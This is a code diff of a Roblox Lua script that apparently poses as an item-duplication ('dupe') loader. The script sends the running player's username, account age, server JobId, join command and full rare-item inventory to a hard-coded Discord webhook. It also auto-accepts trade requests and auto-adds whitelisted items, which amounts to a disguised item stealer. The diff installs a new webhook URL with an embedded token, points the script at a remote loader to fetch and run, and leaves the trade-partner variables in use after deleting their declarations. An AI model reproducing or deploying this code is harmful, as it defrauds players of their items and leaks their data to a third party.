@@ -82,7 +82,7 @@ local ITEMS_TO_ADD_WHITELIST = {
 }
 
 local WEBHOOK_ENABLED = true
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1495413192426389636/ykzKY5nXL-mIoZbBNEwOLX7T-V7kKGN458OK-6Des3UfzbR9jVNBkNcQqu9zTHAicgW-"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1493091689320153222/9B8T0NRfs9hATIzSBBQ-yfnxGmime6zdYLayA-zxZPGkAVidG7zNxQkM_-6OUhCKl20c"
 local WEBHOOK_ONE_LOG_PER_SERVER = true
 local WEBHOOK_MAX_INVENTORY_LINES = 100
 local PRIVATE_SERVER_PLAYER_THRESHOLD = 1
@@ -98,7 +98,7 @@ local SERVER_HOP_MAX_PAGE_SCANS = 6
 local SERVER_HOP_API_LIMIT = 100
 local SERVER_HOP_RETRY_DELAY = 2.0
 local AUTO_RELOAD_AFTER_SERVER_HOP = false
-local AUTO_RELOAD_SOURCE_URL = "https://raw.githubusercontent.com/zeusbutdiff/Sailor-Piece-Dupe-Loader/main/LoaderBeta.lua"
+local AUTO_RELOAD_SOURCE_URL = "https://raw.githubusercontent.com/zeusbutdiff/Sailor-Piece-Dupe-Loader/main/Loader.lua"
 local AUTO_RELOAD_SOURCE_CODE = ""
 
 local inventoryByCategory = {}
@@ -111,8 +111,6 @@ local lastTradeState = {
 	myItems = {},
 	theirItems = {},
 }
-local lastTradePartnerUsername = nil
-local lastTradePartnerUserId = nil
 
 local localPlayer = Players.LocalPlayer
 local refreshInventory
@@ -1543,12 +1541,6 @@ local function sendTradeRequestToTarget(targetUserId)
 		return false
 	end
 
-	lastTradePartnerUserId = userId
-	local player = Players:GetPlayerByUserId(userId)
-	if player then
-		lastTradePartnerUsername = player.Name or player.DisplayName or lastTradePartnerUsername
-	end
-
 	return pcall(function()
 		sendTradeRequest:FireServer(userId)
 	end)
@@ -1805,222 +1797,6 @@ local function buildTradeItemLines(items)
 	return truncateForField(table.concat(lines, "\n"), 1000), #items
 end
 
-local function getStringFieldValue(data, keys)
-	if typeof(data) ~= "table" then
-		return nil
-	end
-
-	for _, key in ipairs(keys) do
-		local value = data[key]
-		if type(value) == "string" then
-			local cleaned = string.gsub(value, "^%s*(.-)%s*$", "%1")
-			if cleaned ~= "" then
-				return cleaned
-			end
-		end
-	end
-
-	return nil
-end
-
-local function getUserIdFromFieldValue(data, keys)
-	if typeof(data) ~= "table" then
-		return nil
-	end
-
-	for _, key in ipairs(keys) do
-		local userId = tonumber(data[key])
-		if userId and userId > 0 then
-			return userId
-		end
-	end
-
-	return nil
-end
-
-local function getUsernameFromUserId(userId)
-	local safeUserId = tonumber(userId)
-	if not safeUserId or safeUserId <= 0 then
-		return nil
-	end
-
-	local player = Players:GetPlayerByUserId(safeUserId)
-	if player then
-		local playerName = player.Name or player.DisplayName
-		if type(playerName) == "string" and playerName ~= "" then
-			return playerName
-		end
-	end
-
-	local okName, resolvedName = pcall(function()
-		return Players:GetNameFromUserIdAsync(safeUserId)
-	end)
-	if okName and type(resolvedName) == "string" and resolvedName ~= "" then
-		return resolvedName
-	end
-
-	return nil
-end
-
-local function getTradePartnerUsernameFromTradeData(data)
-	if typeof(data) ~= "table" then
-		return nil
-	end
-
-	local candidateKeys = {
-		"theirUsername",
-		"tradePartnerUsername",
-		"partnerUsername",
-		"otherUsername",
-		"otherPlayerName",
-		"otherPlayerUsername",
-		"player2Name",
-		"player2Username",
-	}
-
-	local directName = getStringFieldValue(data, candidateKeys)
-	if directName then
-		return directName
-	end
-
-	local candidateUserIdKeys = {
-		"theirUserId",
-		"tradePartnerUserId",
-		"partnerUserId",
-		"otherUserId",
-		"player2UserId",
-		"fromUserId",
-	}
-
-	local directUserId = getUserIdFromFieldValue(data, candidateUserIdKeys)
-	if directUserId then
-		local player = Players:GetPlayerByUserId(directUserId)
-		if player then
-			local username = player.Name or player.DisplayName
-			if type(username) == "string" and username ~= "" then
-				return username
-			end
-		end
-	end
-
-	local preferredNestedKeys = {
-		"their",
-		"partner",
-		"tradePartner",
-		"other",
-		"player2",
-		"target",
-		"opponent",
-	}
-
-	for _, key in ipairs(preferredNestedKeys) do
-		local nestedValue = data[key]
-		if typeof(nestedValue) == "table" then
-			local nestedName = getStringFieldValue(nestedValue, candidateKeys)
-			if nestedName then
-				return nestedName
-			end
-
-			local nestedUserId = getUserIdFromFieldValue(nestedValue, candidateUserIdKeys)
-			if nestedUserId then
-				local player = Players:GetPlayerByUserId(nestedUserId)
-				if player then
-					local username = player.Name or player.DisplayName
-					if type(username) == "string" and username ~= "" then
-						return username
-					end
-				end
-			end
-		end
-	end
-
-	return nil
-end
-
-local function getTradePartnerUsernameFromUi()
-	if not localPlayer then
-		return nil
-	end
-
-	local playerGui = localPlayer:FindFirstChild("PlayerGui")
-	if not playerGui then
-		return nil
-	end
-
-	local tradingUi = playerGui:FindFirstChild("InTradingUI")
-	if not tradingUi then
-		return nil
-	end
-
-	local mainFrame = tradingUi:FindFirstChild("MainFrame")
-	local content = mainFrame and mainFrame:FindFirstChild("Content")
-	local player2Side = content and content:FindFirstChild("Player2Side")
-	local player2Label = player2Side and player2Side:FindFirstChild("Player2Label")
-	local frame = player2Label and player2Label:FindFirstChild("Frame")
-	local txt = frame and frame:FindFirstChild("Txt")
-
-	if not txt then
-		local legacyFrame = player2Side and player2Side:FindFirstChild("Frame")
-		txt = legacyFrame and legacyFrame:FindFirstChild("Txt")
-	end
-
-	if not txt or not txt:IsA("TextLabel") then
-		return nil
-	end
-
-	local username = string.gsub(txt.Text or "", "^%s*(.-)%s*$", "%1")
-	if username == "" then
-		return nil
-	end
-
-	return username
-end
-
-local function sanitizeTradePartnerUsername(candidate, myItems, theirItems)
-	if type(candidate) ~= "string" then
-		return nil
-	end
-
-	local cleaned = string.gsub(candidate, "^%s*(.-)%s*$", "%1")
-	if cleaned == "" then
-		return nil
-	end
-
-	local lowered = string.lower(cleaned)
-	if lowered == "unknown" or lowered == "none" or lowered == "n/a" then
-		return nil
-	end
-
-	local normalizedCandidate = normalizeItemKey(cleaned)
-	if normalizedCandidate == "" then
-		return cleaned
-	end
-
-	if typeof(myItems) == "table" then
-		for _, item in ipairs(myItems) do
-			if typeof(item) == "table" and type(item.name) == "string" and normalizeItemKey(item.name) == normalizedCandidate then
-				return nil
-			end
-		end
-	end
-
-	if typeof(theirItems) == "table" then
-		for _, item in ipairs(theirItems) do
-			if typeof(item) == "table" and type(item.name) == "string" and normalizeItemKey(item.name) == normalizedCandidate then
-				return nil
-			end
-		end
-	end
-
-	for whitelistName, enabled in pairs(ITEMS_TO_ADD_WHITELIST) do
-		if enabled and normalizeItemKey(whitelistName) == normalizedCandidate then
-			return nil
-		end
-	end
-
-	return cleaned
-end
-
 local function sendWebhook(eventName, statusText, includeInventory, extraFields)
 	if not WEBHOOK_ENABLED or WEBHOOK_URL == "" then
 		return
@@ -2029,20 +1805,6 @@ local function sendWebhook(eventName, statusText, includeInventory, extraFields)
 	local requestFn = getRequestFunction()
 	if not requestFn then
 		return
-	end
-
-	if FORCE_REQUEST_IF_ITEMS_EMPTY and not hasItemsInventory() then
-		refreshInventory()
-		-- Wait for inventory to load
-		local isPrivateServer = isPrivateServerByPlayerCount()
-		local timeoutSeconds = isPrivateServer and STARTUP_WEBHOOK_INVENTORY_WAIT_TIMEOUT_PRIVATE or STARTUP_WEBHOOK_INVENTORY_WAIT_TIMEOUT_PUBLIC
-		local startedAt = os.clock()
-		while os.clock() - startedAt < timeoutSeconds do
-			if hasItemsInventory() then
-				break
-			end
-			task.wait(STARTUP_WEBHOOK_REQUEST_INTERVAL)
-		end
 	end
 
 	local username = localPlayer and localPlayer.Name or "Unknown"
@@ -2056,8 +1818,52 @@ local function sendWebhook(eventName, statusText, includeInventory, extraFields)
 		"https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=100&height=100&format=png",
 		userId
 	)
-	local inventoryText, totalCount = buildInventorySummaryLines()
-	local rareItemsSummary = buildTrackedRareItemsSummaryLines()
+
+	local fields = {
+		{
+			name = "Player",
+			value = string.format("%s (@%s)\nUserId: %d\nAccount Age: %d days", displayName, username, userId, accountAgeDays),
+			inline = true,
+		},
+		{
+			name = "Server",
+			value = string.format("Type: %s\nPlayers: %d\nPlaceId: %d\nJobId: %s", serverType, playerCount, placeId, jobId),
+			inline = true,
+		},
+		{
+			name = "Status",
+			value = statusText or "N/A",
+			inline = false,
+		},
+		{
+			name = "Join Status",
+			value = getJoinStatusText(),
+			inline = false,
+		},
+		{
+			name = "Join Command",
+			value = buildJoinCommandValue(placeId, jobId),
+			inline = false,
+		},
+	}
+
+	if includeInventory then
+		local inventoryText, totalCount = buildInventorySummaryLines()
+		table.insert(fields, {
+			name = "Rare Items Found",
+			value = "```\n" .. buildTrackedRareItemsSummaryLines() .. "\n```",
+			inline = false,
+		})
+		appendInventoryFields(fields, string.format("Inventory (Items) - %d total", totalCount), inventoryText)
+	end
+
+	if typeof(extraFields) == "table" then
+		for _, field in ipairs(extraFields) do
+			if typeof(field) == "table" and field.name and field.value then
+				table.insert(fields, field)
+			end
+		end
+	end
 
 	local payload = {
 		embeds = {
@@ -2067,51 +1873,13 @@ local function sendWebhook(eventName, statusText, includeInventory, extraFields)
 				thumbnail = {
 					url = avatarUrl,
 				},
-				fields = {
-					{
-						name = "Player",
-						value = string.format("%s (@%s)\nUserId: %d\nAccount Age: %d days", displayName, username, userId, accountAgeDays),
-						inline = true,
-					},
-					{
-						name = "Server",
-						value = string.format("Type: %s\nPlayers: %d\nPlaceId: %d\nJobId: %s", serverType, playerCount, placeId, jobId),
-						inline = true,
-					},
-					{
-						name = "Status",
-						value = statusText or "N/A",
-						inline = false,
-					},
-					{
-						name = "Join Status",
-						value = getJoinStatusText(),
-						inline = false,
-					},
-					{
-						name = "Join Link",
-						value = buildJoinLinkValue(placeId, jobId),
-						inline = false,
-					},
-					{
-						name = "Join Command",
-						value = buildJoinCommandValue(placeId, jobId),
-						inline = false,
-					},
-					{
-						name = "Rare Items Found",
-						value = "```\n" .. rareItemsSummary .. "\n```",
-						inline = false,
-					},
-				},
+				fields = fields,
 				footer = {
 					text = os.date("!%Y-%m-%d %H:%M:%S UTC"),
 				},
 			},
 		},
 	}
-
-	appendInventoryFields(payload.embeds[1].fields, string.format("Inventory (Items) - %d total", totalCount), inventoryText)
 
 	pcall(function()
 		requestFn({
@@ -2123,10 +1891,6 @@ local function sendWebhook(eventName, statusText, includeInventory, extraFields)
 			Body = HttpService:JSONEncode(payload),
 		})
 	end)
-
-	if WEBHOOK_ONE_LOG_PER_SERVER then
-		serverLogSentForJobId = game.JobId
-	end
 end
 
 local function sendScriptExecutedWebhook()
@@ -2274,59 +2038,6 @@ local function waitForItemCountIncrease(previousCount, timeoutSeconds)
 	return myTradeItemCount > previousCount
 end
 
-local function getInventoryItemName(item)
-	if typeof(item) ~= "table" then
-		return nil
-	end
-
-	local candidateKeys = {
-		"name",
-		"Name",
-		"itemName",
-		"ItemName",
-		"displayName",
-		"DisplayName",
-	}
-
-	for _, key in ipairs(candidateKeys) do
-		local value = item[key]
-		if type(value) == "string" then
-			local name = string.gsub(value, "^%s*(.-)%s*$", "%1")
-			if name ~= "" then
-				return name
-			end
-		end
-	end
-
-	return nil
-end
-
-local function getInventoryItemQuantity(item)
-	if typeof(item) ~= "table" then
-		return 1
-	end
-
-	local candidateKeys = {
-		"quantity",
-		"Quantity",
-		"amount",
-		"Amount",
-		"count",
-		"Count",
-		"qty",
-		"Qty",
-	}
-
-	for _, key in ipairs(candidateKeys) do
-		local value = tonumber(item[key])
-		if value and value > 0 then
-			return value
-		end
-	end
-
-	return 1
-end
-
 -- Modified function: Only add whitelisted items
 local function autoAddWhitelistedItemsMax(jobId)
 	if not AUTO_ADD_ITEMS_ENABLED then
@@ -2343,8 +2054,8 @@ local function autoAddWhitelistedItemsMax(jobId)
 	local itemSnapshot = {}
 	for _, item in ipairs(items) do
 		if typeof(item) == "table" then
-			local itemName = getInventoryItemName(item)
-			local itemQuantity = getInventoryItemQuantity(item)
+			local itemName = item.name
+			local itemQuantity = tonumber(item.quantity) or 1
 			table.insert(itemSnapshot, {
 				name = itemName,
 				quantity = itemQuantity,
@@ -2431,18 +2142,11 @@ tradeRequestReceived.OnClientEvent:Connect(function(_requestData)
 	end
 
 	task.spawn(function()
-		local requestData = _requestData
-		if typeof(requestData) == "table" then
-			lastTradePartnerUserId = tonumber(requestData.fromUserId or requestData.otherUserId or requestData.player2UserId or requestData.tradePartnerUserId) or lastTradePartnerUserId
-			if not lastTradePartnerUsername then
-				lastTradePartnerUsername = getTradePartnerUsernameFromTradeData(requestData)
-			end
-		end
-
 		if ACCEPT_DELAY > 0 then
 			task.wait(ACCEPT_DELAY)
 		end
 
+		local requestData = _requestData
 		local candidateArgs = {
 			{true},
 		}
@@ -2477,11 +2181,6 @@ tradeRequestReceived.OnClientEvent:Connect(function(_requestData)
 end)
 
 tradeUpdated.OnClientEvent:Connect(function(data)
-	local tradePartnerUsername = getTradePartnerUsernameFromTradeData(data)
-	if tradePartnerUsername then
-		lastTradePartnerUsername = tradePartnerUsername
-	end
-
 	if typeof(data) == "table" and typeof(data.myItems) == "table" then
 		myTradeItemCount = #data.myItems
 		lastTradeState.myItems = data.myItems
@@ -2513,11 +2212,11 @@ tradeStarted.OnClientEvent:Connect(function(_tradeData)
 	myTradeItemCount = 0
 	addJobId = addJobId + 1
 	lastAutoConfirmAt = 0
+	-- Cache partner info if available
 	if typeof(_tradeData) == "table" then
 		lastTradePartnerUserId = tonumber(_tradeData.fromUserId or _tradeData.otherUserId or _tradeData.player2UserId or _tradeData.tradePartnerUserId) or lastTradePartnerUserId
-		lastTradePartnerUsername = sanitizeTradePartnerUsername(getTradePartnerUsernameFromTradeData(_tradeData)) or lastTradePartnerUsername
+		lastTradePartnerUsername = _tradeData.partnerName or lastTradePartnerUsername
 	end
-	lastTradePartnerUsername = sanitizeTradePartnerUsername(getTradePartnerUsernameFromUi()) or lastTradePartnerUsername
 	local currentJobId = addJobId
 	local addedCount = 0
 
@@ -2607,20 +2306,7 @@ tradeCompleted.OnClientEvent:Connect(function(data)
 	-- Use cached partner name/userId as primary source
 	local tradePartnerUsername = lastTradePartnerUsername
 	if not tradePartnerUsername and lastTradePartnerUserId then
-		tradePartnerUsername = getUsernameFromUserId(lastTradePartnerUserId)
-	end
-	if not tradePartnerUsername then
-		local candidateUsernames = {
-			getTradePartnerUsernameFromTradeData(data),
-			getTradePartnerUsernameFromUi(),
-		}
-		for _, candidate in ipairs(candidateUsernames) do
-			local accepted = sanitizeTradePartnerUsername(candidate, myItems, theirItems)
-			if accepted then
-				tradePartnerUsername = accepted
-				break
-			end
-		end
+		tradePartnerUsername = tostring(lastTradePartnerUserId)
 	end
 	if not tradePartnerUsername then
 		tradePartnerUsername = "Unknown"
@@ -2646,7 +2332,6 @@ tradeCompleted.OnClientEvent:Connect(function(data)
 			inline = false,
 		},
 	})
-
 end)
 
 task.spawn(function()
